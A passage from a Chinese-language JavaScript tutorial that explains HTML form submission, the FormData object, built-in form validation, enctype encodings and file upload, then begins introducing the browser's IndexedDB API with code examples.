          <input type="submit" id="submit" name="submit_button" value="提交" />
        </div>
      </form>

   上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。

   用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的 ``name`` 属性，键值是控件的 ``value`` 属性，键名和键值之间由等号连接。比如，用户名输入框的 ``name`` 属性是 ``user_name`` ， ``value`` 属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对 ``user_name=张三`` 。

   所有的键值对都会提交到服务器。但是，提交的数据格式跟 ``<form>`` 元素的 ``method`` 属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如 ``/handling-page?user_name=张三&user_passwd=123&submit_button=提交`` 。下面就是 GET 请求的 HTTP 头信息。

   .. code:: http

      GET /handling-page?user_name=张三&user_passwd=123&submit_button=提交
      Host: example.com

   如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如 ``user_name=张三&user_passwd=123&submit_button=提交`` 。下面就是 POST 请求的头信息。

   .. code:: http

      POST /handling-page HTTP/1.1
      Host: example.com
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 74
   
      user_name=张三&user_passwd=123&submit_button=提交

   注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。

   点击 ``submit`` 控件，就可以提交表单。

   .. code:: html

      <form>
        <input type="submit" value="提交">
      </form>

   上面表单就包含一个 ``submit`` 控件，点击这个控件，浏览器就会把表单数据向服务器提交。

   注意，表单里面的 ``<button>`` 元素如果没有用 ``type`` 属性指定类型，那么默认就是 ``submit`` 控件。

   .. code:: html

      <form>
        <button>提交</button>
      </form>

   上面表单的 ``<button>`` 元素，点击以后也会提交表单。

   除了点击 ``submit`` 控件提交表单，还可以用表单元素的 ``submit()`` 方法，通过脚本提交表单。

   .. code:: javascript

      formElement.submit();

   表单元素的 ``reset()`` 方法可以重置所有控件的值（重置为默认值）。

   .. code:: javascript

      formElement.reset()

FormData 对象
------------


概述
~~~

   表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成这个过程，构造或编辑表单的键值对，然后通过脚本发送给服务器。浏览器原生提供了 FormData 对象来完成这项工作。

    ``FormData()`` 首先是一个构造函数，用来生成表单的实例。

   .. code:: javascript

      var formdata = new FormData(form);

    ``FormData()`` 构造函数的参数是一个 DOM 的表单元素，构造函数会自动处理表单的键值对。这个参数是可选的，如果省略该参数，就表示一个空的表单。

   下面是一个表单。

   .. code:: html

      <form id="myForm" name="myForm">
        <div>
          <label for="username">用户名：</label>
          <input type="text" id="username" name="username">
        </div>
        <div>
          <label for="useracc">账号：</label>
          <input type="text" id="useracc" name="useracc">
        </div>
        <div>
          <label for="userfile">上传文件：</label>
          <input type="file" id="userfile" name="userfile">
        </div>
      <input type="submit" value="Submit!">
      </form>

   我们用 ``FormData()`` 处理上面这个表单。

   .. code:: javascript

      var myForm = document.getElementById('myForm');
      var formData = new FormData(myForm);
   
      // 获取某个控件的值
      formData.get('username') // ""
   
      // 设置某个控件的值
      formData.set('username', '张三');
   
      formData.get('username') // "张三"

实例方法
~~~~~~~

   FormData 提供以下实例方法。

   -  ``FormData.get(key)`` ：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。
   -  ``FormData.getAll(key)`` ：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。
   -  ``FormData.set(key, value)`` ：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。
   -  ``FormData.delete(key)`` ：删除一个键值对，参数为键名。
   -  ``FormData.append(key, value)`` ：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。
   -  ``FormData.has(key)`` ：返回一个布尔值，表示是否具有该键名的键值对。
   -  ``FormData.keys()`` ：返回一个遍历器对象，用于 ``for...of`` 循环遍历所有的键名。
   -  ``FormData.values()`` ：返回一个遍历器对象，用于 ``for...of`` 循环遍历所有的键值。
   -  ``FormData.entries()`` ：返回一个遍历器对象，用于 ``for...of`` 循环遍历所有的键值对。如果直接用 ``for...of`` 循环遍历 FormData 实例，默认就会调用这个方法。

   下面是 ``get()`` 、 ``getAll()`` 、 ``set()`` 、 ``append()`` 方法的例子。

   .. code:: javascript

      var formData = new FormData();
   
      formData.set('username', '张三');
      formData.append('username', '李四');
      formData.get('username') // "张三"
      formData.getAll('username') // ["张三", "李四"]
   
      formData.append('userpic[]', myFileInput.files[0], 'user1.jpg');
      formData.append('userpic[]', myFileInput.files[1], 'user2.jpg');

   下面是遍历器的例子。

   .. code:: javascript

      var formData = new FormData();
      formData.append('key1', 'value1');
      formData.append('key2', 'value2');
   
      for (var key of formData.keys()) {
        console.log(key);
      }
      // "key1"
      // "key2"
   
      for (var value of formData.values()) {
        console.log(value);
      }
      // "value1"
      // "value2"
   
      for (var pair of formData.entries()) {
        console.log(pair[0] + ': ' + pair[1]);
      }
      // key1: value1
      // key2: value2
   
      // 等同于遍历 formData.entries()
      for (var pair of formData) {
        console.log(pair[0] + ': ' + pair[1]);
      }
      // key1: value1
      // key2: value2

表单的内置验证
------------


自动校验
~~~~~~~

   表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。

   .. code:: html

      <!-- 必填 -->
      <input required>
   
      <!-- 必须符合正则表达式 -->
      <input pattern="banana|cherry">
   
      <!-- 字符串长度必须为6个字符 -->
      <input minlength="6" maxlength="6">
   
      <!-- 数值必须在1到10之间 -->
      <input type="number" min="1" max="10">
   
      <!-- 必须填入 Email 地址 -->
      <input type="email">
   
      <!-- 必须填入 URL -->
      <input type="URL">

   如果一个控件通过验证，它就会匹配 ``:valid`` 的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配 ``:invalid`` 的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。

   .. code:: css

      input:invalid {
        border-color: red;
      }
      input,
      input:valid {
        border-color: #ccc;
      }

checkValidity()
~~~~~~~~~~~~~~~~

   除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有 ``checkValidity()`` 方法，用于手动触发校验。

   .. code:: javascript

      // 触发整个表单的校验
      form.checkValidity()
   
      // 触发单个表单控件的校验
      formControl.checkValidity()

    ``checkValidity()`` 方法返回一个布尔值， ``true`` 表示通过校验， ``false`` 表示没有通过校验。因此，提交表单可以封装为下面的函数。

   .. code:: javascript

      function submitForm(action) {
        var form = document.getElementById('form');
        form.action = action;
        if (form.checkValidity()) {
          form.submit();
        }
      }

willValidate 属性
~~~~~~~~~~~~~~~~

   控件元素的 ``willValidate`` 属性是一个布尔值，表示该控件是否会在提交时进行校验。

   .. code:: javascript

      // HTML 代码如下
      // <form novalidate>
      //   <input id="name" name="name" required />
      // </form>
   
      var input = document.querySelector('#name');
      input.willValidate // true

validationMessage 属性
~~~~~~~~~~~~~~~~~~~~~~

   控件元素的 ``validationMessage`` 属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。

   - 该控件不会在提交时自动校验
   - 该控件满足校验条件

   .. code:: javascript

      // HTML 代码如下
      // <form><input type="text" required></form>
      document.querySelector('form input').validationMessage
      // "请填写此字段。"

   下面是另一个例子。

   .. code:: javascript

      var myInput = document.getElementById('myinput');
      if (!myInput.checkValidity()) {
        document.getElementById('prompt').innerHTML = myInput.validationMessage;
      }

setCustomValidity()
~~~~~~~~~~~~~~~~~~~~

   控件元素的 ``setCustomValidity()`` 方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。

   这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。

   .. code:: html

      <form action="somefile.php">
        <input
          type="text"
          name="username"
          placeholder="Username"
          pattern="[a-z]{1,15}"
          id="username"
        >
        <input type="submit">
      </form>

   上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用 ``setCustomValidity()`` 方法替换掉报错信息。

   .. code:: javascript

      var input = document.getElementById('username');
      input.oninvalid = function (event) {
        event.target.setCustomValidity(
          '用户名必须是小写字母，不能为空，最长不超过15个字符'
        );
      }

   上面代码中， ``setCustomValidity()`` 方法是在 ``invalid`` 事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。

   .. code:: javascript

      /* HTML 代码如下
      <form>
        <p><input type="file" id="fs"></p>
        <p><input type="submit"></p>
      </form>
      */
   
      document.getElementById('fs').onchange = checkFileSize;
   
      function checkFileSize() {
        var fs = document.getElementById('fs');
        var files = fs.files;
        if (files.length > 0) {
           if (files[0].size > 75 * 1024) {
             fs.setCustomValidity('文件不能大于 75KB');
             return;
           }
        }
        fs.setCustomValidity('');
      }

   上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。

validity 属性
~~~~~~~~~~~~

   控件元素的属性 ``validity`` 属性返回一个 ``ValidityState`` 对象，包含当前校验状态的信息。

   该对象有以下属性，全部为只读属性。

   -  ``ValidityState.badInput`` ：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。
   -  ``ValidityState.customError`` ：布尔值，表示是否已经调用 ``setCustomValidity()`` 方法，将校验信息设置为一个非空字符串。
   -  ``ValidityState.patternMismatch`` ：布尔值，表示用户输入的值是否不满足模式的要求。
   -  ``ValidityState.rangeOverflow`` ：布尔值，表示用户输入的值是否大于最大范围。
   -  ``ValidityState.rangeUnderflow`` ：布尔值，表示用户输入的值是否小于最小范围。
   -  ``ValidityState.stepMismatch`` ：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。
   -  ``ValidityState.tooLong`` ：布尔值，表示用户输入的字数超出了最长字数。
   -  ``ValidityState.tooShort`` ：布尔值，表示用户输入的字符少于最短字数。
   -  ``ValidityState.typeMismatch`` ：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。
   -  ``ValidityState.valid`` ：布尔值，表示用户是否满足所有校验条件。
   -  ``ValidityState.valueMissing`` ：布尔值，表示用户没有填入必填的值。

   下面是一个例子。

   .. code:: javascript

      var input = document.getElementById('myinput');
      if (input.validity.valid) {
        console.log('通过校验');
      } else {
        console.log('校验失败');
      }

   下面是另外一个例子。

   .. code:: javascript

      var txt = '';
      if (document.getElementById('myInput').validity.rangeOverflow) {
        txt = '数值超过上限';
      }
      document.getElementById('prompt').innerHTML = txt;

   如果想禁止浏览器弹出表单验证的报错信息，可以监听 ``invalid`` 事件。

   .. code:: javascript

      var input = document.getElementById('username');
      var form  = document.getElementById('form');
   
      var elem = document.createElement('div');
      elem.id  = 'notify';
      elem.style.display = 'none';
      form.appendChild(elem);
   
      input.addEventListener('invalid', function (event) {
        event.preventDefault();
        if (!event.target.validity.valid) {
          elem.textContent   = '用户名必须是小写字母';
          elem.className     = 'error';
          elem.style.display = 'block';
          input.className    = 'invalid animated shake';
        }
      });
   
      input.addEventListener('input', function(event){
        if ( 'block' === elem.style.display ) {
          input.className = '';
          elem.style.display = 'none';
        }
      });

   上面代码中，一旦发生 ``invalid`` 事件（表单验证失败）， ``event.preventDefault()`` 用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。

表单的 novalidate 属性
~~~~~~~~~~~~~~~~~~~~

   表单元素的 HTML 属性 ``novalidate`` ，可以关闭浏览器的自动校验。

   .. code:: html

      <form novalidate>
      </form>

   这个属性也可以在脚本里设置。

   .. code:: javascript

      form.noValidate = true;

   如果表单元素没有设置 ``novalidate`` 属性，那么提交按钮（ ``<button>`` 或 ``<input>`` 元素）的 ``formnovalidate`` 属性也有同样的作用。

   .. code:: html

      <form>
        <input type="submit" value="submit" formnovalidate>
      </form>

enctype 属性
-----------

   表单能够用四种编码，向服务器发送数据。编码格式由表单的 ``enctype`` 属性决定。

   假定表单有两个字段，分别是 ``foo`` 和 ``baz`` ，其中 ``foo`` 字段的值等于 ``bar`` ， ``baz`` 字段的值是一个分为两行的字符串。

   .. code::

      The first line.
      The second line.


   下面四种格式，都可以将这个表单发送到服务器。

   **（1）GET 方法**

   如果表单使用 ``GET`` 方法发送数据， ``enctype`` 属性无效。

   .. code:: html

      <form
        action="register.php"
        method="get"
        onsubmit="AJAXSubmit(this); return false;"
      >
      </form>

   数据将以 URL 的查询字符串发出。

   .. code:: http

      ?foo=bar&baz=The%20first%20line.%0AThe%20second%20line.

   **（2）application/x-www-form-urlencoded**

   如果表单用 ``POST`` 方法发送数据，并省略 ``enctype`` 属性，那么数据以 ``application/x-www-form-urlencoded`` 格式发送（因为这是默认值）。

   .. code:: html

      <form
        action="register.php"
        method="post"
        onsubmit="AJAXSubmit(this); return false;"
      >
      </form>

   发送的 HTTP 请求如下。

   .. code:: http

      Content-Type: application/x-www-form-urlencoded
   
      foo=bar&baz=The+first+line.%0D%0AThe+second+line.%0D%0A

   上面代码中，数据体里面的 ``%0D%0A`` 代表换行符（ ``\r\n`` ）。

   **（3）text/plain**

   如果表单使用 ``POST`` 方法发送数据， ``enctype`` 属性为 ``text/plain`` ，那么数据将以纯文本格式发送。

   .. code:: html

      <form
        action="register.php"
        method="post"
        enctype="text/plain"
        onsubmit="AJAXSubmit(this); return false;"
      >
      </form>

   发送的 HTTP 请求如下。

   .. code:: http

      Content-Type: text/plain
   
      foo=bar
      baz=The first line.
      The second line.

   **（4）multipart/form-data**

   如果表单使用 ``POST`` 方法， ``enctype`` 属性为 ``multipart/form-data`` ，那么数据将以混合的格式发送。

   .. code:: html

      <form
        action="register.php"
        method="post"
        enctype="multipart/form-data"
        onsubmit="AJAXSubmit(this); return false;"
      >
      </form>

   发送的 HTTP 请求如下。

   .. code:: http

      Content-Type: multipart/form-data; boundary=---------------------------314911788813839
   
      -----------------------------314911788813839
      Content-Disposition: form-data; name="foo"
   
      bar
      -----------------------------314911788813839
      Content-Disposition: form-data; name="baz"
   
      The first line.
      The second line.
   
      -----------------------------314911788813839--

   这种格式也是文件上传的格式。

文件上传
-------

   用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。

   .. code:: html

      <input type="file" id="file" name="myFile">

   此外，还需要将表单 ``<form>`` 元素的 ``method`` 属性设为 ``POST`` ， ``enctype`` 属性设为 ``multipart/form-data`` 。其中， ``enctype`` 属性决定了 HTTP 头信息的 ``Content-Type`` 字段的值，默认情况下这个字段的值是 ``application/x-www-form-urlencoded`` ，但是文件上传的时候要改成 ``multipart/form-data`` 。

   .. code:: html

      <form method="post" enctype="multipart/form-data">
        <div>
          <label for="file">选择一个文件</label>
          <input type="file" id="file" name="myFile" multiple>
        </div>
        <div>
          <input type="submit" id="submit" name="submit_button" value="上传" />
        </div>
      </form>

   上面的 HTML 代码中，file 控件的 ``multiple`` 属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。

   .. code:: javascript

      var fileSelect = document.getElementById('file');
      var files = fileSelect.files;

   然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。

   .. code:: javascript

      var formData = new FormData();
   
      for (var i = 0; i < files.length; i++) {
        var file = files[i];
   
        // 只上传图片文件
        if (!file.type.match('image.*')) {
          continue;
        }
   
        formData.append('photos[]', file, file.name);
      }

   最后，使用 Ajax 向服务器上传文件。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
   
      xhr.open('POST', 'handler.php', true);
   
      xhr.onload = function () {
        if (xhr.status !== 200) {
          console.log('An error occurred!');
        }
      };
   
      xhr.send(formData);

   除了发送 FormData 实例，也可以直接 AJAX 发送文件。

   .. code:: javascript

      var file = document.getElementById('test-input').files[0];
      var xhr = new XMLHttpRequest();
   
      xhr.open('POST', 'myserver/uploads');
      xhr.setRequestHeader('Content-Type', file.type);
      xhr.send(file);

参考链接
-------

   - [HTML5 Form Validation With the “pattern” Attribute](https://webdesign.tutsplus.com/tutorials/html5-form-validation-with-the-pattern-attribute--cms-25145), Thoriq Firdaus

/🟠 IndexedDB API
==================

概述
---

   随着浏览器的功能不断增强，越来越多的网站开始考虑，将大量数据储存在客户端，这样可以减少从服务器获取数据，直接从本地获取数据。

   现有的浏览器数据储存方案，都不适合储存大量数据：Cookie 的大小不超过 4KB，且每次请求都会发送回服务器；LocalStorage 在 2.5MB 到 10MB 之间（各家浏览器不同），而且不提供搜索功能，不能建立自定义的索引。所以，需要一种新的解决方案，这就是 IndexedDB 诞生的背景。

   通俗地说，IndexedDB 就是浏览器提供的本地数据库，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。

   IndexedDB 具有以下特点。

   **（1）键值对储存。** IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以“键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。

   **（2）异步。**  IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。

   **（3）支持事务。** IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。

   **（4）同源限制。** IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。

   **（5）储存空间大。** IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。

   **（6）支持二进制储存。** IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。

基本概念
-------

   IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。

   - 数据库：IDBDatabase 对象
   - 对象仓库：IDBObjectStore 对象
   - 索引： IDBIndex 对象
   - 事务： IDBTransaction 对象
   - 操作请求：IDBRequest 对象
   - 指针： IDBCursor 对象
   - 主键集合：IDBKeyRange 对象

   下面是一些主要的概念。

   **（1）数据库**

   数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。

   IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。

   **（2）对象仓库**

   每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。

   **（3）数据记录**

   对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。

   .. code:: javascript

      { id: 1, text: 'foo' }

   上面的对象中， ``id`` 属性可以当作主键。

   数据体可以是任意数据类型，不限于对象。

   **（4）索引**

   为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。

   **（5）事务**

   数据记录的读写和删改，都要通过事务完成。事务对象提供 ``error`` 、 ``abort`` 和 ``complete`` 三个事件，用来监听操作结果。

操作流程
-------

   IndexedDB 数据库的各种操作，一般是按照下面的流程进行的。这个部分只给出简单的代码示例，用于快速上手，详细的各个对象的 API 放在后文介绍。

打开数据库
~~~~~~~~

   使用 IndexedDB 的第一步是打开数据库，使用 ``indexedDB.open()`` 方法。

   .. code:: javascript

      var request = window.indexedDB.open(databaseName, version);

   这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为 ``1`` 。

    ``indexedDB.open()`` 方法返回一个 IDBRequest 对象。这个对象通过三种事件 ``error`` 、 ``success`` 、 ``upgradeneeded`` ，处理打开数据库的操作结果。

   **（1）error 事件**

    ``error`` 事件表示打开数据库失败。

   .. code:: javascript

      request.onerror = function (event) {
        console.log('数据库打开报错');
      };

   **（2）success 事件**

    ``success`` 事件表示成功打开数据库。

   .. code:: javascript

      var db;
   
      request.onsuccess = function (event) {
        db = request.result;
        console.log('数据库打开成功');
      };

   这时，通过 ``request`` 对象的 ``result`` 属性拿到数据库对象。

   **（3）upgradeneeded 事件**

   如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件 ``upgradeneeded`` 。

   .. code:: javascript

      var db;
   
      request.onupgradeneeded = function (event) {
        db = event.target.result;
      }

   这时通过事件对象的 ``target.result`` 属性，拿到数据库实例。

新建数据库
~~~~~~~~

   新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在 ``upgradeneeded`` 事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。

   通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。

   .. code:: javascript

      request.onupgradeneeded = function(event) {
        db = event.target.result;
        var objectStore = db.createObjectStore('person', { keyPath: 'id' });
      }

   上面代码中，数据库新建成功以后，新增一张叫做 ``person`` 的表格，主键是 ``id`` 。

   更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。

   .. code:: javascript

      request.onupgradeneeded = function (event) {
        db = event.target.result;
        var objectStore;
        if (!db.objectStoreNames.contains('person')) {
          objectStore = db.createObjectStore('person', { keyPath: 'id' });
        }
      }

   主键（key）是默认建立索引的属性。比如，数据记录是 ``{ id: 1, name: '张三' }`` ，那么 ``id`` 属性可以作为主键。主键也可以指定为下一层对象的属性，比如 ``{ foo: { bar: 'baz' } }`` 的 ``foo.bar`` 也可以指定为主键。

   如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。

   .. code:: javascript

      var objectStore = db.createObjectStore(
        'person',
        { autoIncrement: true }
      );

   上面代码中，指定主键为一个递增的整数。

   新建对象仓库以后，下一步可以新建索引。

   .. code:: javascript

      request.onupgradeneeded = function(event) {
        db = event.target.result;
        var objectStore = db.createObjectStore('person', { keyPath: 'id' });
        objectStore.createIndex('name', 'name', { unique: false });
        objectStore.createIndex('email', 'email', { unique: true });
      }

   上面代码中， ``IDBObject.createIndex()`` 的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。

新增数据
~~~~~~~

   新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。

   .. code:: javascript

      function add() {
        var request = db.transaction(['person'], 'readwrite')
          .objectStore('person')
          .add({ id: 1, name: '张三', age: 24, email: 'zhangsan@example.com' });
   
        request.onsuccess = function (event) {
          console.log('数据写入成功');
        };
   
        request.onerror = function (event) {
          console.log('数据写入失败');
        }
      }
   
      add();

   上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过 ``IDBTransaction.objectStore(name)`` 方法，拿到 IDBObjectStore 对象，再通过表格对象的 ``add()`` 方法，向表格写入一条记录。

   写入操作是一个异步操作，通过监听连接对象的 ``success`` 事件和 ``error`` 事件，了解是否写入成功。

读取数据
~~~~~~~

   读取数据也是通过事务完成。

   .. code:: javascript

      function read() {
         var transaction = db.transaction(['person']);
         var objectStore = transaction.objectStore('person');
         var request = objectStore.get(1);
   
         request.onerror = function(event) {
           console.log('事务失败');
         };
   
         request.onsuccess = function( event) {
            if (request.result) {
              console.log('Name: ' + request.result.name);
              console.log('Age: ' + request.result.age);
              console.log('Email: ' + request.result.email);
            } else {
              console.log('未获得数据记录');
            }
         };
      }
   
      read();

   上面代码中， ``objectStore.get()`` 方法用于读取数据，参数是主键的值。

遍历数据
~~~~~~~

   遍历数据表格的所有记录，要使用指针对象 IDBCursor。

   .. code:: javascript

      function readAll() {
        var objectStore = db.transaction('person').objectStore('person');
   
         objectStore.openCursor().onsuccess = function (event) {
           var cursor = event.target.result;
   
           if (cursor) {
             console.log('Id: ' + cursor.key);
             console.log('Name: ' + cursor.value.name);
             console.log('Age: ' + cursor.value.age);
             console.log('Email: ' + cursor.value.email);
             cursor.continue();
          } else {
            console.log('没有更多数据了！');
          }
        };
      }
   
      readAll();

   上面代码中，新建指针对象的 ``openCursor()`` 方法是一个异步操作，所以要监听 ``success`` 事件。

更新数据
~~~~~~~

   更新数据要使用 ``IDBObject.put()`` 方法。

   .. code:: javascript

      function update() {
        var request = db.transaction(['person'], 'readwrite')
          .objectStore('person')
          .put({ id: 1, name: '李四', age: 35, email: 'lisi@example.com' });
   
        request.onsuccess = function (event) {
          console.log('数据更新成功');
        };
   
        request.onerror = function (event) {
          console.log('数据更新失败');
        }
      }
   
      update();

   上面代码中， ``put()`` 方法自动更新了主键为 ``1`` 的记录。

删除数据
~~~~~~~

    ``IDBObjectStore.delete()`` 方法用于删除记录。

   .. code:: javascript

      function remove() {
        var request = db.transaction(['person'], 'readwrite')
          .objectStore('person')
          .delete(1);
   
        request.onsuccess = function (event) {
          console.log('数据删除成功');
        };
      }
   
      remove();

使用索引
~~~~~~~

   索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。

   假定新建表格的时候，对 ``name`` 字段建立了索引。

   .. code:: javascript

      objectStore.createIndex('name', 'name', { unique: false });

   现在，就可以从 ``name`` 找到对应的数据记录了。

   .. code:: javascript

      var transaction = db.transaction(['person'], 'readonly');
      var store = transaction.objectStore('person');
      var index = store.index('name');
      var request = index.get('李四');
   
      request.onsuccess = function (e) {
        var result = e.target.result;
        if (result) {
          // ...
        } else {
          // ...
        }
      }

indexedDB 对象
--------------

   浏览器原生提供 ``indexedDB`` 对象，作为开发者的操作接口。

indexedDB.open()
~~~~~~~~~~~~~~~~~

    ``indexedDB.open()`` 方法用于打开数据库。这是一个异步操作，但是会立刻返回一个 IDBOpenDBRequest 对象。

   .. code:: javascript

      var openRequest = window.indexedDB.open('test', 1);

   上面代码表示，打开一个名为 ``test`` 、版本为 ``1`` 的数据库。如果该数据库不存在，则会新建该数据库。

    ``open()`` 方法的第一个参数是数据库名称，格式为字符串，不可省略；第二个参数是数据库版本，是一个大于 ``0`` 的正整数（ ``0`` 将报错），如果该参数大于当前版本，会触发数据库升级。第二个参数可省略，如果数据库已存在，将打开当前版本的数据库；如果数据库不存在，将创建该版本的数据库，默认版本为 ``1`` 。

   打开数据库是异步操作，通过各种事件通知客户端。下面是有可能触发的4种事件。

   - **success**：打开成功。
   - **error**：打开失败。
   - **upgradeneeded**：第一次打开该数据库，或者数据库版本发生变化。
   - **blocked**：上一次的数据库连接还未关闭。

   第一次打开数据库时，会先触发 ``upgradeneeded`` 事件，然后触发 ``success`` 事件。

   根据不同的需要，对上面4种事件监听函数。

   .. code:: javascript

      var openRequest = indexedDB.open('test', 1);
      var db;
   
      openRequest.onupgradeneeded = function (e) {
        console.log('Upgrading...');
      }
   
      openRequest.onsuccess = function (e) {
        console.log('Success!');
        db = openRequest.result;
      }
   
      openRequest.onerror = function (e) {
        console.log('Error');
        console.log(e);
      }

   上面代码有两个地方需要注意。首先， ``open()`` 方法返回的是一个对象（IDBOpenDBRequest），监听函数就定义在这个对象上面。其次， ``success`` 事件发生后，从 ``openRequest.result`` 属性可以拿到已经打开的 ``IndexedDB`` 数据库对象。

indexedDB.deleteDatabase()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``indexedDB.deleteDatabase()`` 方法用于删除一个数据库，参数为数据库的名字。它会立刻返回一个 ``IDBOpenDBRequest`` 对象，然后对数据库执行异步删除。删除操作的结果会通过事件通知， ``IDBOpenDBRequest`` 对象可以监听以下事件。

   -  ``success`` ：删除成功
   -  ``error`` ：删除报错

   .. code:: javascript

      var DBDeleteRequest = window.indexedDB.deleteDatabase('demo');
   
      DBDeleteRequest.onerror = function (event) {
        console.log('Error');
      };
   
      DBDeleteRequest.onsuccess = function (event) {
        console.log('success');
      };

   调用 ``deleteDatabase()`` 方法以后，当前数据库的其他已经打开的连接都会接收到 ``versionchange`` 事件。

   注意，删除不存在的数据库并不会报错。

indexedDB.cmp()
~~~~~~~~~~~~~~~~

    ``indexedDB.cmp()`` 方法比较两个值是否为 indexedDB 的相同的主键。它返回一个整数，表示比较的结果： ``0`` 表示相同， ``1`` 表示第一个主键大于第二个主键， ``-1`` 表示第一个主键小于第二个主键。

   .. code:: javascript

      window.indexedDB.cmp(1, 2) // -1

   注意，这个方法不能用来比较任意的 JavaScript 值。如果参数是布尔值或对象，它会报错。

   .. code:: javascript

      window.indexedDB.cmp(1, true) // 报错
      window.indexedDB.cmp({}, {}) // 报错

IDBRequest 对象
--------------

   IDBRequest 对象表示打开的数据库连接， ``indexedDB.open()`` 方法和 ``indexedDB.deleteDatabase()`` 方法会返回这个对象。数据库的操作都是通过这个对象完成的。

   这个对象的所有操作都是异步操作，要通过 ``readyState`` 属性判断是否完成，如果为 ``pending`` 就表示操作正在进行，如果为 ``done`` 就表示操作完成，可能成功也可能失败。

   操作完成以后，触发 ``success`` 事件或 ``error`` 事件，这时可以通过 ``result`` 属性和 ``error`` 属性拿到操作结果。如果在 ``pending`` 阶段，就去读取这两个属性，是会报错的。

   IDBRequest 对象有以下属性。

